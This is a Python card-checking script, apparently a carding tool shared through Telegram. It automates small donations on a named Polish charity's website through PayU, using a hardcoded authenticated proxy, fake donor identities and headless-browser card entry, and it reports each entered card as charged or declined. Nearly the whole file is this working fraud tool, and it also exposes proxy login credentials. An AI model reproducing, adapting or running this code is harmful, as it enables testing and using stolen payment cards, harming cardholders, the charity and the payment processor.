#!/usr/bin/env python3
#t.me/sunilxd
#t.me/sunilxd
import asyncio
import re
import json
import logging
import random
import string
import time
import uuid
from urllib.parse import urlparse, parse_qs, urlencode
from playwright.async_api import async_playwright
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ColoredFormatter(logging.Formatter):
    grey     = "\x1b[38;20m"
    yellow   = "\x1b[33;20m"
    red      = "\x1b[31;20m"
    green    = "\x1b[32;20m"
    blue     = "\x1b[34;20m"
    bold_red = "\x1b[31;1m"
    cyan     = "\x1b[36;20m"
    magenta  = "\x1b[35;20m"
    reset    = "\x1b[0m"

    def format(self, record):
        msg = record.getMessage()
        lvl = record.levelname
        if lvl == "DEBUG":       color = self.blue
        elif lvl == "WARNING":   color = self.yellow
        elif lvl == "ERROR":     color = self.red
        elif lvl == "CRITICAL":  color = self.bold_red
        else:                    color = self.grey
        if "RESPONSE" in msg or "Status Code" in msg: color = self.green
        if "proxy" in msg.lower() or "PROXY" in msg:  color = self.cyan
        if "STEP" in msg or "STARTING" in msg:        color = self.magenta
        record.levelname = f"{color}{lvl}{self.reset}"
        return super().format(record)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)
for handler in logger.handlers:
    handler.setFormatter(ColoredFormatter('%(asctime)s - %(levelname)s - %(message)s'))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY POOL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXY_LIST = [
    {"host": "175.29.133.8", "port": 5433, "username": "799JRELTBPAE", "password": "F7BQ7D3EQSQA", "tag": "Proxy-1"},
]


class ProxyRotator:
    def __init__(self, proxies, mode="sequential"):
        self.proxies = list(proxies)
        self.mode = mode
        self.index = 0
        self.usage_count = 0

    def get_next(self):
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        self.usage_count += 1
        return proxy

    def get_proxy_url(self, proxy):
        return f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"

    def get_proxies_dict(self, proxy):
        url = self.get_proxy_url(proxy)
        return {'http': url, 'https': url}

    def get_stats(self):
        return {"total_proxies": len(self.proxies), "current_index": self.index % len(self.proxies), "total_uses": self.usage_count}


proxy_rotator = ProxyRotator(PROXY_LIST, mode="sequential")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NAME / EMAIL GENERATORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FIRST_NAMES = ["John","Jane","Michael","Emily","David","Sarah","Robert","Lisa","James","Mary","William","Patricia","Thomas","Jennifer","Charles","Linda","Christopher","Elizabeth","Daniel","Barbara","Matthew","Susan","Anthony","Jessica","Mark","Karen","Steven","Nancy","Andrew","Betty","Kevin","Dorothy","Brian","Sandra","George","Ashley","Timothy","Kimberly","Ronald","Donna","Edward","Michelle","Jason","Carol","Jeffrey","Amanda","Ryan","Melissa","Jacob","Deborah","Gary","Stephanie","Eric","Rebecca","Jonathan","Sharon","Stephen","Laura","Larry","Cynthia","Justin","Kathleen","Scott","Amy","Brandon","Angela","Benjamin","Shirley","Samuel","Anna","Raymond","Brenda","Gregory","Pamela","Frank","Emma","Alexander","Nicole","Patrick","Helen","Jack","Samantha","Dennis","Katherine","Jerry","Christine","Tyler","Debra","Aaron","Rachel","Jose","Carolyn","Adam","Janet","Nathan","Catherine","Henry","Maria","Douglas","Heather","Peter","Diane","Zachary","Ruth"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes","Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper","Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson","Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes","Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez","Powell"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","zoho.com","yandex.com"]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PAYU PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class PayUProcessor:
    DONATION_SITE_URL = "https://ladnehistorie.pl/en/support-us/"
    DONATION_AMOUNT   = "20"  # PLN 20.00 minimum

    _COOKIES = {
        'cookieyes-consent': 'consentid:Vzd3aFdxcUJKUzlrOTlXeEtZU1YwZE9ia0Z2TFRhNkM,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
        'wp_consent_preferences': 'allow',
        'wp_consent_statistics': 'allow',
        'wp_consent_statistics-anonymous': 'allow',
        'wp_consent_functional': 'allow',
        'wp_consent_marketing': 'allow',
    }

    _UA = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36'

    def __init__(self, proxy_info=None):
        self.session = requests.Session()
        self.proxy_info = proxy_info or proxy_rotator.get_next()
        self.session.proxies.update(proxy_rotator.get_proxies_dict(self.proxy_info))
        self.session.verify = False
        self.form_id = None
        self.order_id = None
        self.payment_token = None
        self.card_token = None
        self.card_number = None
        self.cvv = None
        self.exp_month = None
        self.exp_year = None
        self.email = None
        self.first_name = None
        self.last_name = None
        self._log_proxy()

    def _log_proxy(self):
        tag = self.proxy_info.get('tag', 'UNKNOWN')
        logger.info(f"PROXY: [{tag}] {self.proxy_info['host']}:{self.proxy_info['port']}")

    # ── Generators ─────────────────────────────────────
    def generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_random_email(self):
        self.email = f"{self.generate_random_string(random.randint(7, 12))}@{random.choice(EMAIL_DOMAINS)}"
        return self.email

    def generate_random_name(self):
        self.first_name = random.choice(FIRST_NAMES)
        self.last_name = random.choice(LAST_NAMES)
        return self.first_name, self.last_name

    # ── Card parsing ───────────────────────────────────
    def validate_card_number(self, card_number):
        card_number = card_number.replace(' ', '').replace('-', '')
        if not card_number.isdigit() or not (13 <= len(card_number) <= 19): return False
        total = 0
        for i, digit in enumerate(card_number[::-1]):
            d = int(digit)
            if i % 2 == 1: d *= 2
            if d > 9: d = (d // 10) + (d % 10)
            total += d
        return total % 10 == 0

    def parse_card_details(self, card_details_str):
        logger.info(f"Parsing card: {card_details_str[:6]}{'*'*20}{card_details_str[-4:]}")
        try:
            parts = card_details_str.split('|')
            if len(parts) != 4: return False, "Format: number|mm|yy|cvv"
            self.card_number = parts[0].strip().replace(' ', '').replace('-', '')
            self.exp_month = parts[1].strip().zfill(2)
            self.exp_year = parts[2].strip()
            if len(self.exp_year) == 2: self.exp_year = "20" + self.exp_year
            self.cvv = parts[3].strip()
            if not self.validate_card_number(self.card_number): return False, "CARD_NUMBER_ERROR"
            is_amex = self.card_number.startswith('3') and len(self.card_number) == 15
            if not is_amex and len(self.cvv) != 3: return False, "CVV must be 3 digits"
            if is_amex and len(self.cvv) != 4: return False, "CVV must be 4 digits"
            if not (1 <= int(self.exp_month) <= 12): return False, "INVALID_EXPIRY"
            if int(self.exp_year) < int(time.strftime("%Y")): return False, "INVALID_EXPIRY"
            logger.info(f"Card OK: {self.card_number[:6]}******{self.card_number[-4:]} | {self.exp_month}/{self.exp_year}")
            return True, "Success"
        except Exception as e:
            return False, str(e)

    # ── Helpers ────────────────────────────────────────
    def log_response(self, response, context=""):
        logger.info(f"{'='*60}\nRESPONSE - {context}\n{'='*60}")
        logger.info(f"Status: {response.status_code} | URL: {response.url}")
        try: logger.info(f"Body: {json.dumps(response.json(), indent=2)[:1000]}")
        except: logger.info(f"Body: {response.text[:500]}")

    # ── STEP 0: Get dynamic form ID ────────────────────
    def get_form_id(self):
        logger.info("STEP 0 — Getting form ID...")
        try:
            r = self.session.get(self.DONATION_SITE_URL, headers={'user-agent': self._UA}, timeout=30)
            match = re.search(r'name="flexible_donation\[form_id\]"\s+value="(\d+)"', r.text)
            if match:
                self.form_id = match.group(1)
                logger.info(f"Form ID: {self.form_id}")
                return self.form_id
        except Exception as e:
            logger.error(f"Form ID fetch failed: {e}")
        self.form_id = "5827"  # fallback
        logger.warning(f"Using fallback form ID: {self.form_id}")
        return self.form_id

    # ── STEP 1: POST donation form ─────────────────────
    def start_payment(self):
        logger.info("STEP 1 — POST donation form...")
        self.get_form_id()
        cookie_str = '; '.join(f"{k}={v}" for k, v in self._COOKIES.items())

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://ladnehistorie.pl',
            'referer': self.DONATION_SITE_URL,
            'user-agent': self._UA,
            'cookie': cookie_str,
        }

        form_parts = [
            ('flexible_donation[first_name]', self.first_name),
            ('flexible_donation[last_name]', self.last_name),
            ('flexible_donation[email]', self.email),
            ('flexible_donation[amount]', self.DONATION_AMOUNT),
            ('flexible_donation[comment]', ''),
            ('flexible_donation[payment_method]', 'payu'),
            ('flexible_donation[terms]', 'no'),
            ('flexible_donation[terms]', 'yes'),
            ('flexible_donation[form_id]', self.form_id),
            ('flexible_donation[send_donation]', 'Send donation'),
            ('trp-form-language', 'en'),
        ]

        try:
            response = self.session.post(self.DONATION_SITE_URL, data=urlencode(form_parts), headers=headers, allow_redirects=False, timeout=30)
        except Exception as e:
            logger.error(f"Donation POST failed: {e}")
            return None

        logger.info(f"Donation response: {response.status_code}")
        redirect_url = response.headers.get('location') or response.headers.get('Location')

        if not redirect_url:
            payu_match = re.search(r'https://secure\.payu\.com[^\s"\',<>]+', response.text)
            if payu_match: redirect_url = payu_match.group(0)

        if not redirect_url:
            logger.error("No redirect URL found")
            self.log_response(response, "Donation Form POST")
            return None

        logger.info(f"PayU redirect: {redirect_url}")
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        if 'orderId' in query_params and 'token' in query_params:
            self.order_id = query_params['orderId'][0]
            self.payment_token = query_params['token'][0]
            logger.info(f"Order: {self.order_id}")
        return redirect_url

    # ── STEP 2: Follow redirect ────────────────────────
    def follow_redirect(self):
        logger.info("STEP 2 — Following redirect...")
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': self._UA,
        }
        url = f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}'
        response = self.session.get(url, headers=headers, allow_redirects=True)
        logger.info(f"Final URL: {response.url}")
        return response

    # ── STEP 3: Get order data ─────────────────────────
    def get_order_data(self):
        logger.info("STEP 3 — Get order data...")
        headers = {
            'accept': '*/*',
            'authorization': f'Bearer {self.payment_token}',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'user-agent': self._UA,
        }
        response = self.session.get(f'https://secure.payu.com/api/front/orders/{self.order_id}', headers=headers)
        if response.status_code == 200:
            data = response.json()
            logger.info(f"Amount: {data.get('amount')} {data.get('currency')}")
            return data
        return None

    # ── STEP 4: Tokenize card ──────────────────────────
    def tokenize_card(self):
        logger.info("STEP 4 — Tokenizing card...")
        order_data = self.get_order_data()
        pos_id = order_data.get('posId') if order_data else 'u4Qkhkxo'
        logger.info(f"POS: {pos_id}")

        headers = {
            'accept': '*/*',
            'authorization': f'Bearer {self.payment_token}',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'user-agent': self._UA,
        }
        json_data = {
            'posId': pos_id,
            'type': 'SINGLE',
            'card': {
                'number': self.card_number,
                'cvv': self.cvv,
                'expirationMonth': self.exp_month,
                'expirationYear': self.exp_year,
            },
        }
        response = self.session.post('https://secure.payu.com/api/front/tokens', headers=headers, json=json_data)
        if response.status_code == 200:
            resp = response.json()
            if 'value' in resp:
                self.card_token = resp['value']
                logger.info(f"Token: {self.card_token[:30]}...")
                return resp
        self.log_response(response, "Tokenize")
        return None

    # ── STEP 5: Make payment via Playwright ─────────────
    async def make_payment_browser(self):
        logger.info("STEP 5 — Making payment via browser...")
        exp = f'{self.exp_month}/{self.exp_year[2:]}'

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, channel='chrome', args=['--no-sandbox'])
            page = await (await browser.new_context(viewport={'width': 1440, 'height': 900})).new_page()

            url = f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}'
            logger.info(f"Loading: {url[:80]}...")
            await page.goto(url, wait_until='networkidle', timeout=30000)
            await asyncio.sleep(4)

            # Click Payment card
            try: await page.locator('text="Payment card"').first.click(timeout=5000)
            except: pass
            await asyncio.sleep(4)

            # Fill card
            await page.fill('#number-input', self.card_number)
            await page.fill('#date-input', exp)
            await page.fill('#cvv-input', self.cvv)
            await asyncio.sleep(2)

            # Submit
            try: await page.click('input[name="submit"]')
            except: pass

            await asyncio.sleep(20)

            # Get status
            status_data = await page.evaluate(f'''async () => {{
                const r = await fetch('https://secure.payu.com/api/front/orders/{self.order_id}/status', {{
                    headers: {{ authorization: 'Bearer {self.payment_token}' }}
                }});
                return await r.json();
            }}''')

            body = await page.evaluate('() => document.body.innerText')
            logger.info(f"Status: {json.dumps(status_data)}")
            logger.info(f"Page: {body[:300]}")

            await browser.close()
            return status_data, body

    # ── Status determination ───────────────────────────
    def determine_status(self, status_data, page_body=""):
        logger.info("Determining final status...")
        if not status_data:
            return {"value": "Unable to authorize payment.(ERROR)", "status": "declined", "code": "ERROR"}

        value = status_data.get("value", "")
        cat = status_data.get("category", "")

        if "AUTHORIZED" in str(value) and "3DS_NOT_AUTHORIZED" not in str(value):
            return {"value": "Payment authorized - successful.", "status": "charged", "code": "AUTHORIZED"}
        if "REFUSED_BY_ISSUER" in str(value):
            return {"value": "Bank refused the payment.", "status": "declined", "code": "REFUSED_BY_ISSUER"}
        if "NOT_ACCEPTED" in str(value):
            msg = "Payment not accepted."
            for line in page_body.split('\n'):
                if 'something went wrong' in line.lower():
                    msg += f" {line.strip()}"
                    break
            return {"value": msg, "status": "declined", "code": "NOT_ACCEPTED"}
        if "CARD_INSUFFICIENT_FUNDS" in str(value):
            return {"value": "Insufficient funds.", "status": "declined", "code": "CARD_INSUFFICIENT_FUNDS"}
        if "CARD_NUMBER_ERROR" in str(value) or "INVALID_NUMBER" in str(value):
            return {"value": "Invalid card number.", "status": "declined", "code": "CARD_NUMBER_ERROR"}
        if "CVV_ERROR" in str(value):
            return {"value": "Invalid CVV.", "status": "declined", "code": "CVV_ERROR"}
        if "ERROR" in str(value) or cat == "ERROR":
            return {"value": "Payment error.", "status": "declined", "code": "ERROR"}

        return {"value": str(value) or "Unknown", "status": "declined", "code": "UNKNOWN"}

    # ── MAIN PROCESS ───────────────────────────────────
    async def process(self, card_details_str):
        logger.info(f"\n{'#'*60}\n# STARTING PAYMENT — ladnehistorie.pl\n{'#'*60}\n")
        try:
            success, message = self.parse_card_details(card_details_str)
            if not success:
                return {"value": message, "status": "declined", "code": message}

            self.generate_random_email()
            self.generate_random_name()
            logger.info(f"Identity: {self.first_name} {self.last_name} | Email: {self.email}")

            # STEP 1: Donation form -> PayU redirect
            if not self.start_payment():
                return {"value": "Failed to start payment.(ERROR)", "status": "declined", "code": "ERROR"}

            # STEP 2: Follow redirect
            self.follow_redirect()
            if not self.order_id or not self.payment_token:
                return {"value": "Failed to get order ID.(ERROR)", "status": "declined", "code": "ERROR"}

            # STEP 3+4: Tokenize card
            if not self.tokenize_card():
                return {"value": "Card tokenization failed.(ERROR)", "status": "declined", "code": "ERROR"}

            # STEP 5: Pay via browser
            status_data, page_body = await self.make_payment_browser()
            return self.determine_status(status_data, page_body)

        except Exception as e:
            logger.error(f"Error: {e}")
            return {"value": f"Error: {e}", "status": "declined", "code": "ERROR"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def main():
    print("\n" + "="*60)
    print("  PAYU By T.me/sunilxd")
    print("="*60)
    print("  Format: card_number|mm|yy|cvv")
    print("  Commands: exit\n")

    while True:
        try:
            card_input = input("Card (number|mm|yy|cvv): ").strip()
            if not card_input: continue
            if card_input.lower() in ('exit', 'quit', 'q'): break

            proxy_info = proxy_rotator.get_next()
            processor = PayUProcessor(proxy_info=proxy_info)
            result = await processor.process(card_input)

            print("\n" + "="*60)
            print("  RESULT")
            print("="*60)
            print(f"  Status  : {result.get('status', 'unknown').upper()}")
            print(f"  Message : {result.get('value', 'N/A')}")
            print(f"  Code    : {result.get('code', 'N/A')}")
            print("="*60 + "\n")

        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
